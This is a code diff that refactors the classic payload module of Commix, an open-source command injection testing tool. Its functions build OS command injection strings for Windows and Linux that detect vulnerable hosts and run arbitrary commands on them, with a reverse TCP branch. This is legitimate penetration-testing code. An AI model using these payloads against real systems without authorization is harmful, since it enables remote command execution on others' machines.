@@ -3,13 +3,13 @@
 
 """
 This file is part of Commix Project (https://commixproject.com).
-Copyright (c) 2014-2021 Anastasios Stasinopoulos (@ancst).
+Copyright (c) 2014-2025 Anastasios Stasinopoulos (@ancst).
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
- 
+
 For more see the file 'readme/COPYING' for copying permission.
 """
 
@@ -24,83 +24,64 @@ The available "classic" payloads.
 Classic decision payload (check if host is vulnerable).
 """
 def decision(separator, TAG, randv1, randv2):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     if settings.SKIP_CALC:
       payload = (separator +
-                "echo " + TAG + TAG + TAG + "< nul"
+                "echo " + TAG + TAG + TAG + settings.CMD_NUL
                 )
     else:
         payload = (separator +
-              "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"" + 
-              "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
-              "\"') do @set /p = " + TAG + "%i" + TAG + TAG + "< nul"
-              )  
+              "for /f \"tokens=*\" %i in ('cmd /c \"" +
+              "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" +
+              "\"') do @set /p = " + TAG + "%i" + TAG + TAG + settings.CMD_NUL
+              )
   else:
-    if not settings.WAF_ENABLED:
-      if settings.USE_BACKTICKS:
-        math_calc = "`expr " + str(randv1) + " %2B " + str(randv2) + "`"
-      else:  
-        math_calc = "$((" + str(randv1) + "%2B" + str(randv2) + "))"
+    if settings.USE_BACKTICKS or settings.WAF_ENABLED:
+      math_calc = settings.CMD_SUB_PREFIX + "expr " + str(randv1) + " %2B " + str(randv2) + settings.CMD_SUB_SUFFIX
     else:
-      if settings.USE_BACKTICKS:
-        math_calc = "`expr " + str(randv1) + " %2B " + str(randv2) + "`"
-      else:
-        math_calc = "$(expr " + str(randv1) + " %2B " + str(randv2) + ")"
+      math_calc = settings.CMD_SUB_PREFIX + "(" + str(randv1) + "%2B" + str(randv2) + "))"
 
     if settings.SKIP_CALC:
-      if settings.USE_BACKTICKS:
-        payload = (separator +
-                  "echo " + TAG +
-                  TAG + "" + TAG + ""
-                   )  
-      else:  
-        payload = (separator +
-                  "echo " + TAG +
-                  "$(echo " + TAG + ")" + TAG + ""
-                   ) 
+      payload = (separator +
+                "echo " + TAG +
+                settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG 
+                )
     else:
-      if settings.USE_BACKTICKS:
-        payload = (separator +
-                  "echo " + TAG +
-                  math_calc + 
-                  TAG + "" + TAG + ""
-                   )       
-      else:  
-        payload = (separator +
-                  "echo " + TAG +
-                  math_calc + 
-                  "$(echo " + TAG + ")" + TAG + ""
-                   ) 
+      payload = (separator +
+                "echo " + TAG +
+                math_calc +
+                settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG 
+                )
   return payload
 
 """
 __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_shell(separator, TAG, randv1, randv2):
-  if settings.TARGET_OS == "win":
-    if settings.SKIP_CALC: 
-      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print '" + TAG + "'%2B'" + TAG + "'%2B'" + TAG + "'\""
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    if settings.SKIP_CALC:
+      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print('" + TAG + "'%2B'" + TAG + "'%2B'" + TAG + "')\""
     else:
-      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print '" + TAG + "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" + TAG + "'%2B'" + TAG + "'\""
-     
+      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print('" + TAG + "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" + TAG + "'%2B'" + TAG + "')\""
+
     payload = (separator +
-              "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " + 
+              "for /f \"tokens=*\" %i in ('cmd /c " +
               python_payload +
-              "') do @set /p =%i< nul"
+              "') do @set /p=%i " + settings.CMD_NUL
               )
   else:
     if settings.SKIP_CALC:
       payload = (separator +
-                settings.LINUX_PYTHON_INTERPRETER + " -c \"print'" + TAG +
-                TAG + 
-                TAG + "'\""
+                settings.LINUX_PYTHON_INTERPRETER + " -c \"print('" + TAG +
+                TAG +
+                TAG + "')\""
                 )
     else:
       payload = (separator +
-                settings.LINUX_PYTHON_INTERPRETER + " -c \"print'" + TAG +
-                "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" + 
-                TAG + "'%2B'" + 
-                TAG + "'\""
+                settings.LINUX_PYTHON_INTERPRETER + " -c \"print('" + TAG +
+                "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" +
+                TAG + "'%2B'" +
+                TAG + "')\""
                 )
   return payload
 
@@ -108,65 +89,53 @@ def decision_alter_shell(separator, TAG, randv1, randv2):
 Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, TAG, cmd):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     if settings.REVERSE_TCP:
-      payload = (separator + cmd + " "
+      payload = (separator + 
+                cmd + settings.SINGLE_WHITESPACE
                 )
     else:
       payload = (separator +
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"" + 
-                cmd + 
-                "\"') do @set /p = " + TAG + TAG + "%i" + TAG + TAG + "< nul"
+                "for /f \"tokens=*\" %i in ('cmd /c \"" +
+                cmd +
+                "\"') do @set /p = " + TAG + TAG + "%i" + TAG + TAG + settings.CMD_NUL
                 )
   else:
-     
-    # if not settings.WAF_ENABLED:
-    #   cmd_exec = "$(echo $(" + cmd + "))"
-    # else:
-
-    if settings.USE_BACKTICKS:
-      cmd_exec = "`" + cmd + "`"
-      payload = (separator +
-                "echo " + TAG +
-                "" + TAG + "" +
-                cmd_exec +
-                "" + TAG + "" + TAG + ""
-                )
-    else:
-      cmd_exec = "$(" + cmd + ")"
-      payload = (separator +
-                "echo " + TAG +
-                "$(echo " + TAG + ")" +
-                cmd_exec +
-                "$(echo " + TAG + ")" + TAG + ""
-                )
+    settings.USER_APPLIED_CMD = cmd
+    cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX 
+    payload = (separator +
+              "echo " + TAG +
+              settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  +
+              cmd_exec +
+              settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG
+              )
   return payload
 
 """
 __Warning__: The alternative shells are still experimental.
 """
 def cmd_execution_alter_shell(separator, TAG, cmd):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     if settings.REVERSE_TCP:
-      payload = (separator + cmd + " "
+      payload = (separator + 
+                cmd + settings.SINGLE_WHITESPACE
                 )
     else:
       payload = (separator +
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('" + 
-                settings.WIN_PYTHON_INTERPRETER + " -c \"import os; os.system('powershell.exe -InputFormat none write-host " + TAG + TAG + " $(" + cmd + ") "+ TAG + TAG + "')\"" +
-                "') do @set /p =%i< nul"
+                "for /f \"tokens=*\" %i in ('" +
+                settings.WIN_PYTHON_INTERPRETER + 
+                " -c \"import os; os.system('powershell.exe -InputFormat none write-host " + 
+                TAG + TAG + " $(" + cmd + ") "+ TAG + TAG + "')\"" +
+                "') do @set /p=%i " + settings.CMD_NUL
                 )
-                                                                      
   else:
-
-    if settings.USE_BACKTICKS:
-      payload = (separator +
-                settings.LINUX_PYTHON_INTERPRETER + " -c \"print'" + TAG + "'%2B'" + TAG + "'%2B'`" + cmd + "`" + TAG + "'%2B'" + TAG + "'\""
-                )
-    else:              
-      payload = (separator +
-                settings.LINUX_PYTHON_INTERPRETER + " -c \"print'" + TAG + "'%2B'" + TAG + "'%2B'$(" + cmd + ")'%2B'" + TAG + "'%2B'" + TAG + "'\""
-                )
+    settings.USER_APPLIED_CMD = cmd
+    cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
+    payload = (separator +
+              settings.LINUX_PYTHON_INTERPRETER + 
+              " -c \"print('" + TAG + "'%2B'" + TAG + "'%2B'" + settings.CMD_SUB_PREFIX + "echo " + cmd_exec + settings.CMD_SUB_SUFFIX + "'%2B'" + 
+              TAG + "'%2B'" + TAG + "')\""
+              )
   return payload
 
 # eof
